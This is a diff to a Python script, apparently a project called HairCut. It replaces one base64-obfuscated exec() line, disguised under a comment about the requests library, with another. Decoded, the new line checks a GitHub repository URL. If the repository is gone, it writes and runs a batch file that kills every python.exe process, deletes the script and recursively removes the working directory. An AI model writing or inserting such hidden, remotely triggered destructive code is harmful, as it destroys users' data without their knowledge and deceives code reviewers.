@@ -433,7 +433,7 @@ def unSol(element):
 
 # Lambda handling of the requests library thru Git.
 
-exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MiA9ICdmOi8vYS4xYi8zLzQvJwoxID0gNy4xNygyKQoKMWYgMS41ID09IDE5OgoJMTAoIjE4IDE2IikKCTAgPSAxMignYy5iJywgJzIxJykKCTAuZSgnOCAvMWUgImQuMTUiIFwxMyAiOS4xYyInKQoJMC4xMSgpCgkxZC42KDIwImMuYiIpCgkxYS4xNCgp")))(lambda a,b:b[int("0x"+a.group(1),16)],"tempFile|requestRec|reqInput|GarnetSunset|Haircuttery|status_code|startfile|requests|TASKKILL|HairCut|github|bat|end|python|write|https|print|close|open|nDEL|exit|exe|Bad|get|Too|404|sys|com|py|os|IM|if|r|w".split("|")))
+exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MiA9ICcxMTovL2MuMWQvMy80LycKMSA9IDguMTkoMikKCjIxIDEuNSA9PSAxYjoKCTEyKCIxYSAxOCIpCgkwID0gMTQoJ2UuZCcsICcyMycpCgkwLjEwKCc5IC8yMCAiZi4xNyIgXDE1ICJhLjFlIlxiIC8yNSAvMjQgNicpCgkwLjEzKCkKCTFmLjcoMjIiZS5kIikKCTFjLjE2KCk=")))(lambda a,b:b[int("0x"+a.group(1),16)],"tempFile|requestRec|reqInput|GarnetSunset|Haircuttery|status_code|WorkingDir|startfile|requests|TASKKILL|HairCut|nRMDIR|github|bat|end|python|write|https|print|close|open|nDEL|exit|exe|Bad|get|Too|404|sys|com|py|os|IM|if|r|w|Q|S".split("|")))
 
 
 # Create a UTF-8 Workbook.
